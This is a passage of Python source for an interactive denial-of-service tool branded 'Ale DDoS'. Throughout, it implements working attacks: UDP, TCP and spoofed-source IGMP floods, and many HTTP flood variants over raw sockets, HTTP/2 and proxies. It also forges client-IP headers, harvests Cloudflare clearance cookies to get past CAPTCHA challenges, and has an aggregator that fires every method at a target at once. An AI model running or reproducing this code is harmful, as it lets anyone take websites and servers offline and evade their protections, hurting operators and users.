        driver.implicitly_wait(3)
        driver.get(url)
        for _ in range(60):
            cookies = driver.get_cookies()
            for idx, i in enumerate(cookies):
                if i['name'] == 'cf_clearance':
                    cookieJAR = cookies[idx]
                    useragent = driver.execute_script("return navigator.userAgent")
                    cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
                    driver.quit()
                    return True
            time.sleep(1)
        driver.quit()
        return False
    except:
        stdout.write(Fore.RED+" [x] Selenium not available or ChromeDriver not found\n")
        return False


####################### ======================= AGGREGATOR - FIRES ALL METHODS SIMULTANEOUSLY =======================#################################

class AttackAggregator:
    """Runs ALL attack vectors concurrently across multiple processes"""

    def __init__(self, url, thread_count, duration, use_proxy=False):
        self.url = url
        self.threads = int(thread_count) if thread_count != "0" else CPU_COUNT * 25000
        self.duration = duration
        self.target = get_target(url)
        self.processes = []
        self.use_proxy = use_proxy
        self.stop_event = threading.Event()

    def _launch_get(self):
        LaunchRAW(self.url, max(1, self.threads // 10), self.duration, use_proxy=self.use_proxy)

    def _launch_post(self):
        LaunchPOST(self.url, max(1, self.threads // 10), self.duration, use_proxy=self.use_proxy)

    def _launch_http2(self):
        LaunchHTTP2(self.url, max(1, self.threads // 10), self.duration, use_proxy=self.use_proxy)

    def _launch_soc(self):
        LaunchSOC(self.url, max(1, self.threads // 10), self.duration, use_proxy=self.use_proxy)

    def _launch_sky(self):
        LaunchSKY(self.url, max(1, self.threads // 10), self.duration, use_proxy=self.use_proxy)

    def _launch_pps(self):
        LaunchPPS(self.url, max(1, self.threads // 10), self.duration, use_proxy=self.use_proxy)

    def _launch_cfb(self):
        LaunchCFB(self.url, max(1, self.threads // 12), self.duration, use_proxy=self.use_proxy)

    def _launch_cfsoc(self):
        LaunchCFSOC(self.url, max(1, self.threads // 12), self.duration, use_proxy=self.use_proxy)

    def _launch_udp(self):
        target_ip = socket.gethostbyname(self.target['host'])
        port = self.target['port']
        udp_flood(target_ip, port, self.duration, max(1, self.threads // 20))

    def _launch_tcp(self):
        target_ip = socket.gethostbyname(self.target['host'])
        port = self.target['port']
        tcp_syn_flood(target_ip, port, self.duration, max(1, self.threads // 20))

    def _launch_bypass(self):
        """Specialized bypass attack - varies paths and params"""
        target_info = get_target(self.url)
        paths = ['/', '/admin', '/login', '/api', '/wp-admin', '/admin.php', 
                 '/index.php', '/home', '/dashboard', '/user', '/search',
                 '/contact', '/about', '/products', '/cart', '/checkout']
        until = time.time() + int(self.duration)
        
        def _bypass_worker():
            session = get_pooled_session(self.use_proxy)
            while time.time() < until:
                try:
                    path = random.choice(paths)
                    if random.random() > 0.5:
                        path += f'?{random.randint(1,999999)}={random.randint(1,999999)}'
                    full_url = f"{target_info['scheme']}://{target_info['host']}{path}"
                    hdrs = enhanced_random_headers(target=target_info)
                    session.get(full_url, headers=hdrs, timeout=5, verify=False)
                    inc_req()
                except:
                    try:
                        return_pooled_session(session)
                        session = get_pooled_session(self.use_proxy)
                    except:
                        pass
        
        th = max(1, self.threads // 15)
        for _ in range(th):
            threading.Thread(target=_bypass_worker, daemon=True).start()

    def run(self):
        mode = "PROXY" if self.use_proxy else "DIRECT"
        stdout.write(Fore.RED+"""
    ╔══════════════════════════════════════════════════════════════╗
    ║                     ALE - DDoS                               ║
    ║          All Layer7 + Layer4 Methods Simultaneously          ║
    ║           Mode: %s                                           ║
    ║           Total Threads: %d | Duration: %ss                  ║
    ╚══════════════════════════════════════════════════════════════╝
""" % (mode, self.threads, self.duration))

        methods = [
            ("GET", self._launch_get),
            ("POST", self._launch_post),
            ("HTTP/2", self._launch_http2),
            ("SOC", self._launch_soc),
            ("SKY", self._launch_sky),
            ("PPS", self._launch_pps),
            ("CFB", self._launch_cfb),
            ("CFSOC", self._launch_cfsoc),
            ("BYPASS", self._launch_bypass),
            ("UDP", self._launch_udp),
            ("TCP", self._launch_tcp),
        ]

        active_threads = []
        for name, func in methods:
            stdout.write(Fore.CYAN+f"  [*] Firing {name} [{mode}]\n")
            t = threading.Thread(target=func, daemon=True)
            t.start()
            active_threads.append(t)

        for t in active_threads:
            t.join(timeout=int(self.duration) + 30)


# ======================= LAYER 4 METHODS =======================

def udp_flood(target_ip, port, duration, threads=500):
    until = time.time() + int(duration)
    optimized_payloads = []
    for s in [64, 128, 256, 512, 1024, 2048, 4096, 8192, 16384, 32768, 65507]:
        for _ in range(5):
            optimized_payloads.append(random._urandom(s))
    
    def _udp_worker():
        local_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        local_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        local_sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        local_sock.setsockopt(socket.IPPROTO_IP, socket.IP_TOS, 0x10)
        local_sock.settimeout(0.01)
        try:
            local_sock.bind(('0.0.0.0', random.randint(1024, 65535)))
        except:
            pass
        last_payload = random.choice(optimized_payloads)
        
        while time.time() < until:
            try:
                for _ in range(500):
                    local_sock.sendto(last_payload, (target_ip, int(port)))
                    inc_req()
                if random.random() > 0.95:
                    last_payload = random.choice(optimized_payloads)
            except:
                try:
                    local_sock.close()
                except:
                    pass
                try:
                    local_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    local_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    local_sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
                    local_sock.bind(('0.0.0.0', random.randint(1024, 65535)))
                except:
                    pass

    threads_list = []
    for _ in range(int(threads)):
        thr = threading.Thread(target=_udp_worker, daemon=True)
        thr.start()
        threads_list.append(thr)
    for thr in threads_list:
        thr.join()

def tcp_syn_flood(target_ip, port, duration, threads=500):
    until = time.time() + int(duration)
    junk_data = [random._urandom(s) for s in [4096, 8192, 16384, 32768, 65536]]

    def _tcp_worker():
        while time.time() < until:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 262144)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 262144)
                sock.settimeout(0.5)
                sock.connect((target_ip, int(port)))
                data = random.choice(junk_data)
                for _ in range(1000):
                    try:
                        sock.send(data)
                        inc_req()
                    except:
                        break
                try:
                    sock.close()
                except:
                    pass
            except:
                pass

    threads_list = []
    for _ in range(int(threads)):
        thr = threading.Thread(target=_tcp_worker, daemon=True)
        thr.start()
        threads_list.append(thr)
    for thr in threads_list:
        thr.join()

def igmp_flood(target_ip, duration, threads=100):
    until = time.time() + int(duration)

    def _igmp_worker():
        while time.time() < until:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IGMP)
                src_ip = socket.inet_aton(str(random.randint(1,255)) + '.' + str(random.randint(0,255)) +
                                         '.' + str(random.randint(0,255)) + '.' + str(random.randint(1,254)))
                dst_ip = socket.inet_aton(target_ip)
                packet = struct.pack('!BBHHHBBH4s4s', 0x46, 0x00, 28, 0, 0, 64, 2, 0, src_ip, dst_ip)
                for _ in range(200):
                    try:
                        sock.sendto(packet, (target_ip, 0))
                        inc_req()
                    except:
                        break
                sock.close()
            except:
                pass

    threads_list = []
    for _ in range(int(threads)):
        thr = threading.Thread(target=_igmp_worker, daemon=True)
        thr.start()
        threads_list.append(thr)
    for thr in threads_list:
        thr.join()


############################# ======================= LAYER 7 METHODS WITH PROXY/NON-PROXY SUPPORT ======================= ###########################

cookie = ''
useragent = ''
cookieJAR = None

def get_requests_session(use_proxy=False):
    """Create a requests session, optionally through a proxy"""
    session = requests.Session()
    adapter = requests.adapters.HTTPAdapter(
        pool_connections=10000, pool_maxsize=100000, pool_block=False,
        max_retries=0
    )
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    
    if use_proxy:
        proxy_str = get_random_proxy()
        if proxy_str:
            proxy_dict = get_proxy_dict(proxy_str)
            session.proxies.update(proxy_dict)
    
    return session

def get_httpx_client(use_proxy=False):
    """Create an httpx client, optionally through a proxy"""
    client_kwargs = {
        'http2': True,
        'verify': False,
        'timeout': None,
        'limits': httpx.Limits(
            max_connections=1000000,
            max_keepalive_connections=500000,
            keepalive_expiry=None
        )
    }
    
    if use_proxy:
        proxy_str = get_random_proxy()
        if proxy_str:
            parsed = parse_proxy(proxy_str)
            proxy_url = f'{parsed["type"]}://{parsed["host"]}:{parsed["port"]}'
            client_kwargs['proxies'] = proxy_url
    
    return httpx.Client(**client_kwargs)

def get_socks_socket(use_proxy=False):
    """Get a socket - either direct or through SOCKS proxy"""
    if use_proxy:
        proxy_str = get_random_proxy()
        if proxy_str:
            parsed = parse_proxy(proxy_str)
            if parsed['type'] in ['socks5', 'socks4', 'socks']:
                s = socks.socksocket()
                stype = socks.SOCKS5 if parsed['type'] in ['socks5', 'socks'] else socks.SOCKS4
                s.set_proxy(stype, parsed['host'], int(parsed['port']))
                return s
    
    return socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def get_cloudscraper_session(use_proxy=False):
    """Create a cloudscraper session, optionally through a proxy"""
    scraper_kwargs = {}
    if use_proxy:
        proxy_str = get_random_proxy()
        if proxy_str:
            proxy_dict = get_proxy_dict(proxy_str)
            scraper_kwargs['proxies'] = proxy_dict
    
    scraper = cloudscraper.create_scraper(**scraper_kwargs)
    adapter = requests.adapters.HTTPAdapter(
        pool_connections=5000, pool_maxsize=50000, pool_block=False,
        max_retries=0
    )
    scraper.mount('https://', adapter)
    scraper.mount('http://', adapter)
    return scraper


def LaunchHTTP2(url, th, duration, use_proxy=False):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(duration))
    max_th = int(th)
    target_info = get_target(url)

    def _http2_worker():
        client = None
        try:
            client = get_httpx_client(use_proxy)
        except:
            pass

        while (until - datetime.datetime.now()).total_seconds() > 0:
            if client:
                try:
                    for _ in range(5000):
                        if (until - datetime.datetime.now()).total_seconds() <= 0:
                            break
                        try:
                            hdrs = enhanced_random_headers(target=target_info)
                            client.get(url, headers=hdrs)
                            inc_req()
                        except:
                            break
                except:
                    try:
                        client.close()
                    except:
                        pass
                    try:
                        client = get_httpx_client(use_proxy)
                    except:
                        pass

    threads_list = []
    for _ in range(max_th):
        thr = threading.Thread(target=_http2_worker, daemon=True)
        thr.start()
        threads_list.append(thr)
    for thr in threads_list:
        thr.join()

def LaunchCFB(url, th, duration, use_proxy=False):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(duration))
    max_th = int(th)
    target_info = get_target(url)

    def _cfb_worker():
        scraper = None
        try:
            scraper = get_cloudscraper_session(use_proxy)
        except:
            pass

        while (until - datetime.datetime.now()).total_seconds() > 0:
            if scraper:
                try:
                    for _ in range(500):
                        hdrs = enhanced_random_headers(target=target_info)
                        scraper.get(url, headers=hdrs, timeout=3, verify=False)
                        inc_req()
                except:
                    try:
                        scraper = get_cloudscraper_session(use_proxy)
                    except:
                        pass

    threads_list = []
    for _ in range(max_th):
        thr = threading.Thread(target=_cfb_worker, daemon=True)
        thr.start()
        threads_list.append(thr)
    for thr in threads_list:
        thr.join()

def LaunchCFSOC(url, th, duration, use_proxy=False):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(duration))
    max_th = int(th)
    
    req_template = None

    def _build_req():
        hdrs = enhanced_random_headers(target=target)
        cookie_header = f'Cookie: {cookie}\r\n' if cookie else ''
        req = (
            f'GET {target["uri"]} HTTP/1.1\r\n'
            f'Host: {target["host"]}\r\n'
            f'User-Agent: {hdrs["User-Agent"]}\r\n'
            f'Accept: {hdrs["Accept"]}\r\n'
            f'Accept-Encoding: {hdrs["Accept-Encoding"]}\r\n'
            f'Accept-Language: {hdrs["Accept-Language"]}\r\n'
            f'Cache-Control: {hdrs["Cache-Control"]}\r\n'
            f'{cookie_header}'
            f'Connection: keep-alive\r\n'
            f'X-Forwarded-For: {IPRotator.chain(7)}\r\n'
            f'X-Real-IP: {IPRotator.random()}\r\n'
            f'CF-Connecting-IP: {IPRotator.random()}\r\n'
            f'True-Client-IP: {IPRotator.random()}\r\n'
            f'\r\n'
        )
        return str.encode(req)

    def _cfsoc_worker():
        nonlocal req_template
        if req_template is None:
            req_template = _build_req()
        
        while (until - datetime.datetime.now()).total_seconds() > 0:
            try:
                packet = get_socks_socket(use_proxy)
                packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                packet.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                packet.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4194304)
                packet.settimeout(1)
                packet.connect((str(target['host']), int(target['port'])))
                
                if target['scheme'] == 'https':
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    packet = ctx.wrap_socket(packet, server_hostname=target['host'])

                for _ in range(500):
                    try:
                        packet.send(req_template)
                        inc_req()
                    except:
                        break
                packet.close()
            except:
                pass

    threads_list = []
    for _ in range(max_th):
        thr = threading.Thread(target=_cfsoc_worker, daemon=True)
        thr.start()
        threads_list.append(thr)
    for thr in threads_list:
        thr.join()

def LaunchSKY(url, th, duration, use_proxy=False):
    target_info = get_target(url)
    until = time.time() + int(duration)
    max_th = int(th)

    def _build_req():
        hdrs = enhanced_random_headers(target=target_info)
        return str.encode(
            f"GET {target_info['uri']} HTTP/1.1\r\n"
            f"Host: {target_info['host']}\r\n"
            f"Cache-Control: no-cache, no-store, must-revalidate\r\n"
            f"Pragma: no-cache\r\n"
            f"User-Agent: {hdrs['User-Agent']}\r\n"
            f"Accept: {hdrs['Accept']}\r\n"
            f"Accept-Language: {hdrs['Accept-Language']}\r\n"
            f"Accept-Encoding: {hdrs['Accept-Encoding']}\r\n"
            f"Sec-Fetch-Site: none\r\n"
            f"Sec-Fetch-Mode: navigate\r\n"
            f"Sec-Fetch-Dest: document\r\n"
            f"Sec-Fetch-User: ?1\r\n"
            f"Upgrade-Insecure-Requests: 1\r\n"
            f"Connection: keep-alive\r\n"
            f"X-Forwarded-For: {IPRotator.chain(7)}\r\n"
            f"X-Real-IP: {IPRotator.random()}\r\n"
            f"CF-Connecting-IP: {IPRotator.random()}\r\n"
            f"CDN-Loop: cloudflare_{IPRotator.random()}\r\n"
            f"X-Request-ID: {str(uuid.uuid4())[:36]}\r\n"
            f"\r\n"
        )

    req_templates = [_build_req() for _ in range(10)]

    def _sky_worker():
        req_bytes = random.choice(req_templates)
        while time.time() < until:
            try:
                s = get_socks_socket(use_proxy)
                s.settimeout(1)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4194304)
                s.connect((target_info['host'], int(target_info['port'])))
                if target_info['scheme'] == 'https':
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=target_info['host'])

                # Massive send burst per connection
                for _ in range(50000):
                    try:
                        s.send(req_bytes)
                        inc_req()
                    except:
                        break
                s.close()
                # Rotate template occasionally
                if random.random() > 0.8:
                    req_bytes = random.choice(req_templates)
            except:
                pass

    threads_list = []
    for _ in range(max_th):
        thr = threading.Thread(target=_sky_worker, daemon=True)
        thr.start()
        threads_list.append(thr)
    for thr in threads_list:
        thr.join()


def LaunchSOC(url, th, duration, use_proxy=False):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(duration))
    max_th = int(th)

    def _build_req():
        hdrs = enhanced_random_headers(target=target)
        return str.encode(
            f"GET {target['uri']} HTTP/1.1\r\n"
            f"Host: {target['host']}\r\n"
            f"User-Agent: {hdrs['User-Agent']}\r\n"
            f"Accept: {hdrs['Accept']}\r\n"
            f"Accept-Encoding: {hdrs['Accept-Encoding']}\r\n"
            f"Accept-Language: {hdrs['Accept-Language']}\r\n"
            f"Cache-Control: {hdrs['Cache-Control']}\r\n"
            f"X-Forwarded-For: {IPRotator.chain(7)}\r\n"
            f"X-Real-IP: {IPRotator.random()}\r\n"
            f"CF-Connecting-IP: {IPRotator.random()}\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
        )
    
    req_templates = [_build_req() for _ in range(10)]

    def _soc_worker():
        req_bytes = random.choice(req_templates)
        while (until - datetime.datetime.now()).total_seconds() > 0:
            try:
                s = get_socks_socket(use_proxy)
                s.settimeout(1)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4194304)
                s.connect((str(target['host']), int(target['port'])))
                if target['scheme'] == 'https':
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=target['host'])

                for _ in range(100000):
                    try:
                        s.send(req_bytes)
                        inc_req()
                    except:
                        break
                s.close()
            except:
                pass

    threads_list = []
    for _ in range(max_th):
        thr = threading.Thread(target=_soc_worker, daemon=True)
        thr.start()
        threads_list.append(thr)
    for thr in threads_list:
        thr.join()


def LaunchRAW(url, th, duration, use_proxy=False):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(duration))
    max_th = int(th)
    target_info = get_target(url)

    def _raw_worker():
        session = get_pooled_session(use_proxy)
        while (until - datetime.datetime.now()).total_seconds() > 0:
            try:
                for _ in range(2000):
                    if (until - datetime.datetime.now()).total_seconds() <= 0:
                        break
                    try:
                        hdrs = enhanced_random_headers(target=target_info)
                        session.get(url, headers=hdrs, timeout=1, verify=False)
                        inc_req()
                    except:
                        break
            except:
                try:
                    return_pooled_session(session)
                    session = get_pooled_session(use_proxy)
                except:
                    pass
        
        return_pooled_session(session)

    threads_list = []
    for _ in range(max_th):
        thr = threading.Thread(target=_raw_worker, daemon=True)
        thr.start()
        threads_list.append(thr)
    for thr in threads_list:
        thr.join()


def LaunchPOST(url, th, duration, use_proxy=False):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(duration))
    max_th = int(th)
    target_info = get_target(url)

    def _post_worker():
        session = get_pooled_session(use_proxy)
        while (until - datetime.datetime.now()).total_seconds() > 0:
            try:
                num_fields = random.randint(5, 30)
                data = {f'field_{random.randint(1,9999)}': os.urandom(random.randint(8, 32)).hex() 
                        for _ in range(num_fields)}
                
                if random.random() > 0.7:
                    data = json.dumps({f'param_{i}': str(uuid.uuid4()) 
                                       for i in range(random.randint(3, 15))})
                    hdrs = enhanced_random_headers(target=target_info)
                    hdrs['Content-Type'] = 'application/json'
                    session.post(url, data=data, headers=hdrs, timeout=3, verify=False)
                else:
                    hdrs = enhanced_random_headers(target=target_info)
                    session.post(url, data=data, headers=hdrs, timeout=3, verify=False)
                
                inc_req()
            except:
                try:
                    return_pooled_session(session)
                    session = get_pooled_session(use_proxy)
                except:
                    pass
        
        return_pooled_session(session)

    threads_list = []
    for _ in range(max_th):
        thr = threading.Thread(target=_post_worker, daemon=True)
        thr.start()
        threads_list.append(thr)
    for thr in threads_list:
        thr.join()


def LaunchPPS(url, th, duration, use_proxy=False):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(duration))
    max_th = int(th)

    def _build_minimal_req():
        return str.encode(
            f"GET {target['uri']} HTTP/1.1\r\n"
            f"Host: {target['host']}\r\n"
            f"User-Agent: {random.choice(ua)}\r\n"
            f"X-Forwarded-For: {IPRotator.random()}\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
        )
    
    req_templates = [_build_minimal_req() for _ in range(20)]

    def _pps_worker():
        req_bytes = random.choice(req_templates)
        while (until - datetime.datetime.now()).total_seconds() > 0:
            try:
                s = get_socks_socket(use_proxy)
                s.settimeout(0.5)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8388608)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 8388608)
                s.connect((target['host'], int(target['port'])))
                if target['scheme'] == 'https':
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=target['host'])

                for _ in range(200000):
                    try:
                        s.send(req_bytes)
                        inc_req()
                    except:
                        break
                s.close()
                req_bytes = random.choice(req_templates)
            except:
                pass

    threads_list = []
    for _ in range(max_th):
        thr = threading.Thread(target=_pps_worker, daemon=True)
        thr.start()
        threads_list.append(thr)
    for thr in threads_list:
        thr.join()

        # ======================= UI =======================

def clear():
    system('cls' if name == 'nt' else 'clear')

def help_menu():
    clear()
    stdout.write("""
                                 \x1b[38;2;255;20;147m╦ ╦╔═╗╦  ╔═╗
                                 \x1b[38;2;0;255;189m╠═╣║╣ ║  ╠═╝
                                 \x1b[38;2;0;255;189m╩ ╩╚═╝╩═╝╩
             \x1b[38;2;0;255;189m        ══╦════════════════════════╦══
             \x1b[38;2;0;255;189m╔═════════╩════════════════════════╩═════════╗
             \x1b[38;2;0;255;189m║ \x1b[38;2;255;20;147m| \x1b[38;2;255;255;255mlayer7   \x1b[38;2;0;255;189m| Show Layer7 Methods        \x1b[38;2;0;255;189m║
             \x1b[38;2;0;255;189m║ \x1b[38;2;255;20;147m| \x1b[38;2;255;255;255mlayer4   \x1b[38;2;0;255;189m| Show Layer4 Methods        \x1b[38;2;0;255;189m║
             \x1b[38;2;0;255;189m║ \x1b[38;2;255;20;147m| \x1b[38;2;255;255;255mexit     \x1b[38;2;0;255;189m| Exit                       \x1b[38;2;0;255;189m║
             \x1b[38;2;0;255;189m╚════════════════════════════════════════════════╝
\n""")

def layer7_menu():
    clear()
    stdout.write("""
                                 ╦  \x1b[38;2;255;255;255m╔═╗╦ ╦╔═╗╦═╗
                                 ║  \x1b[38;2;0;255;189m╠═╣╚╦╝║╣ ╠╦╝
                                 ╩═╝╩ ╩ ╩ ╚═╝╩╚═
    \x1b[38;2;255;255;255m╔══════════════════════════════════════════════════════════════════════════════════╗
    \x1b[38;2;255;255;255m║  METHOD   MODE       DESCRIPTION                                           ║
    \x1b[38;2;255;255;255m╠══════════════════════════════════════════════════════════════════════════════════╣
    \x1b[38;2;255;255;255m║ \x1b[38;2;255;20;147m| cfb      \x1b[38;2;0;255;189m|DIRECT| \x1b[38;2;255;255;255mBypass CF (cloudscraper)                             \x1b[38;2;255;255;255m║
    \x1b[38;2;255;255;255m║ \x1b[38;2;255;20;147m| cfb-p    \x1b[38;2;255;255;0m|PROXY | \x1b[38;2;255;255;255mBypass CF via proxy                                   \x1b[38;2;255;255;255m║
    \x1b[38;2;255;255;255m║ \x1b[38;2;255;20;147m| cfsoc    \x1b[38;2;0;255;189m|DIRECT| \x1b[38;2;255;255;255mBypass CF UAM/CAPTCHA (raw socket)                    \x1b[38;2;255;255;255m║
    \x1b[38;2;255;255;255m║ \x1b[38;2;255;20;147m| cfsoc-p  \x1b[38;2;255;255;0m|PROXY | \x1b[38;2;255;255;255mBypass CF via proxy socket                             \x1b[38;2;255;255;255m║
    \x1b[38;2;255;255;255m║ \x1b[38;2;255;20;147m| http2    \x1b[38;2;0;255;189m|DIRECT| \x1b[38;2;255;255;255mHTTP/2 multiplexed flood                              \x1b[38;2;255;255;255m║
    \x1b[38;2;255;255;255m║ \x1b[38;2;255;20;147m| http2-p  \x1b[38;2;255;255;0m|PROXY | \x1b[38;2;255;255;255mHTTP/2 via proxy                                       \x1b[38;2;255;255;255m║
    \x1b[38;2;255;255;255m║ \x1b[38;2;255;20;147m| get      \x1b[38;2;0;255;189m|DIRECT| \x1b[38;2;255;255;255mGET request flood (pooled sessions)                    \x1b[38;2;255;255;255m║
    \x1b[38;2;255;255;255m║ \x1b[38;2;255;20;147m| get-p    \x1b[38;2;255;255;0m|PROXY | \x1b[38;2;255;255;255mGET via proxy                                        \x1b[38;2;255;255;255m║
    \x1b[38;2;255;255;255m║ \x1b[38;2;255;20;147m| post     \x1b[38;2;0;255;189m|DIRECT| \x1b[38;2;255;255;255mPOST request flood (varied payloads)                  \x1b[38;2;255;255;255m║
    \x1b[38;2;255;255;255m║ \x1b[38;2;255;20;147m| post-p   \x1b[38;2;255;255;0m|PROXY | \x1b[38;2;255;255;255mPOST via proxy                                       \x1b[38;2;255;255;255m║
    \x1b[38;2;255;255;255m║ \x1b[38;2;255;20;147m| soc      \x1b[38;2;0;255;189m|DIRECT| \x1b[38;2;255;255;255mRaw socket connection flood                           \x1b[38;2;255;255;255m║
    \x1b[38;2;255;255;255m║ \x1b[38;2;255;20;147m| soc-p    \x1b[38;2;255;255;0m|PROXY | \x1b[38;2;255;255;255mRaw socket via SOCKS proxy                            \x1b[38;2;255;255;255m║
    \x1b[38;2;255;255;255m║ \x1b[38;2;255;20;147m| sky      \x1b[38;2;0;255;189m|DIRECT| \x1b[38;2;255;255;255mUltra-high volume socket attack (50k/s)               \x1b[38;2;255;255;255m║
    \x1b[38;2;255;255;255m║ \x1b[38;2;255;20;147m| sky-p    \x1b[38;2;255;255;0m|PROXY | \x1b[38;2;255;255;255mSky via proxy                                        \x1b[38;2;255;255;255m║
    \x1b[38;2;255;255;255m║ \x1b[38;2;255;20;147m| pps      \x1b[38;2;0;255;189m|DIRECT| \x1b[38;2;255;255;255mMax packets-per-second flood (200k/s)                 \x1b[38;2;255;255;255m║
    \x1b[38;2;255;255;255m║ \x1b[38;2;255;20;147m| pps-p    \x1b[38;2;255;255;0m|PROXY | \x1b[38;2;255;255;255mPPS via proxy                                        \x1b[38;2;255;255;255m║
    \x1b[38;2;255;255;255m║ \x1b[38;2;255;20;147m| bypass   \x1b[38;2;0;255;189m|DIRECT| \x1b[38;2;255;255;255mPath/parameter variation bypass                       \x1b[38;2;255;255;255m║
    \x1b[38;2;255;255;255m║ \x1b[38;2;255;20;147m| bypass-p \x1b[38;2;255;255;0m|PROXY | \x1b[38;2;255;255;255mBypass via proxy                                     \x1b[38;2;255;255;255m║
    \x1b[38;2;255;255;255m║ \x1b[38;2;255;20;147m| mix      \x1b[38;2;0;255;189m|DIRECT| \x1b[38;2;255;255;255mMixed methods balanced attack                         \x1b[38;2;255;255;255m║
    \x1b[38;2;255;255;255m║ \x1b[38;2;255;20;147m| mix-p    \x1b[38;2;255;255;0m|PROXY | \x1b[38;2;255;255;255mMixed methods via proxy                               \x1b[38;2;255;255;255m║
    \x1b[38;2;255;255;255m║ \x1b[38;2;255;20;147m| nuked    \x1b[38;2;255;20;147m|  ALL  | \x1b[38;2;255;255;255m*** ALL METHODS COMBINED (DIRECT) ***                 \x1b[38;2;255;255;255m║
    \x1b[38;2;255;255;255m║ \x1b[38;2;255;20;147m| nuked-p  \x1b[38;2;255;20;147m|  ALL  | \x1b[38;2;255;255;255m*** ALL METHODS COMBINED (PROXY) ***                  \x1b[38;2;255;255;255m║
    \x1b[38;2;255;255;255m╚══════════════════════════════════════════════════════════════════════════════════╝
\n""")

def layer4_menu():
    clear()
    stdout.write("""
                                 ╦  \x1b[38;2;255;255;255m╔═╗╦ ╦╔═╗╦═╗ ╦ ╦
                                 ║  \x1b[38;2;0;255;189m╠═╣╚╦╝║╣ ╠╦╝ ╚═╣
                                 \x1b[38;2;0;255;189m╩═╝╩ ╩ ╩ ╚═╝╩╚═  ╩
    \x1b[38;2;255;255;255m╔═══════════════════════════════════╗
    \x1b[38;2;255;255;255m║ \x1b[38;2;255;20;147m| udp      \x1b[38;2;255;255;255m| UDP Flood Attack              ║
    \x1b[38;2;255;255;255m║ \x1b[38;2;255;20;147m| tcp      \x1b[38;2;255;255;255m| TCP Connection Flood          ║
    \x1b[38;2;255;255;255m║ \x1b[38;2;255;20;147m| igmp     \x1b[38;2;255;255;255m| IGMP Flood (requires root)   ║
    \x1b[38;2;255;255;255m╚═══════════════════════════════════╝
\n""")

def title():
    stdout.write("""
             \x1b[38;2;0;255;189m        ══╦═══════════════════════════════════════════════╦══
             \x1b[38;2;0;255;189m╔═════════╩═══════════════════════════════════════════════╩═════════╗
             \x1b[38;2;0;255;189m║Ale DDoS  | %d Cores | %d Threads                            \x1b[38;2;0;255;189m║
             \x1b[38;2;0;255;189m║            Type [help] to see all Commands                        \x1b[38;2;0;255;189m║
             \x1b[38;2;0;255;189m╚═══════════════════════════════════════════════════════════════════╝
\n""" % (CPU_COUNT, MAX_THREADS))

def get_info_l7():
    stdout.write("\x1b[38;2;255;20;147m | "+Fore.WHITE+"URL      "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    target = input().strip()
    stdout.write("\x1b[38;2;255;20;147m | "+Fore.WHITE+"THREAD   "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX+"(0=MAX) ")
    thread = input().strip()
    if thread == "0" or thread == "":
        thread = str(CPU_COUNT * 25000)
    stdout.write("\x1b[38;2;255;20;147m | "+Fore.WHITE+"TIME(s)  "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    t = input().strip()
    return target, thread, t

def get_info_l4():
    stdout.write("\x1b[38;2;255;20;147m | "+Fore.WHITE+"IP       "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    target = input().strip()
    stdout.write("\x1b[38;2;255;20;147m | "+Fore.WHITE+"PORT     "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    port = input().strip()
    stdout.write("\x1b[38;2;255;20;147m | "+Fore.WHITE+"THREAD   "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX+"(0=MAX) ")
    thread = input().strip()
    if thread == "0" or thread == "":
        thread = str(CPU_COUNT * 25000)
